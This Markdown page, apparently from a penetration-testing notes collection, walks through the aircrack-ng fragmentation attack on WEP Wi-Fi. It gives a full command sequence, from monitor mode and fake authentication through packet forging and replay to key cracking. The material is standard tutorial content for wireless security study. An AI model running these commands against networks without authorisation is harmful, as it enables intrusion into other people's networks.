# Fragmentation (WEP)

This attack, when successful, can obtain 1500 bytes of PRGA (pseudo random generation algorithm). This attack does not recover the WEP key itself, but merely obtains the PRGA. The PRGA can then be used to generate packets with packetforge-ng which are in turn used for various injection attacks. It requires at least one data packet to be received from the access point in order to initiate the attack.

Basically, the program obtains a small amount of keying material from the packet then attempts to send ARP and/or LLC packets with known content to the access point (AP). If the packet is successfully echoed back by the AP then a larger amount of keying information can be obtained from the returned packet. This cycle is repeated several times until 1500 bytes of PRGA are obtained or sometimes less then 1500 bytes.

## Commands

* Run [setup](../../setup.md) first
* Two terminals are needed, so `screen` is your friend
* At least one client must be associated with the AP

```bash
# [Terminal One]
# Set interface to monitor mode
sudo airmon-ng start $DEVICE $CHANNEL

# Start monitoring - make terminal large enough to see everything
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE

# [Terminal Two]
# Run the fake authentication attack against AP
sudo aireplay-ng --fakeauth 7 -a $BSSID -e $SSID -h $INTERFACEMAC $INTERFACE

# Run the fragment attack against AP
sudo aireplay-ng --fragment -b $BSSID -h $INTERFACEMAC $INTERFACE

# Create an ARP request packet
packetforge-ng -0 -a $BSSID  -h  $INTERFACEMAC -l <Source_IP> -k <Dest_IP> -y <XOR_file> -w $OUTPUT

# Check the contents
tcpdump -n -vvv -e -s0 -r $OUTPUT

# Run the interactive attack to jack up IVs
aireplay-ng --interactive -r $OUTPUT $INTERFACE

# Crack the WEP keister (ensure that plenty of IVs are captured beforehand)
aircrack-ng $PCAP
```

## References

* [Airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)
* [Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
* [Fragmentation](https://www.aircrack-ng.org/doku.php?id=fragmentation)
* [REdBlueTeam]()

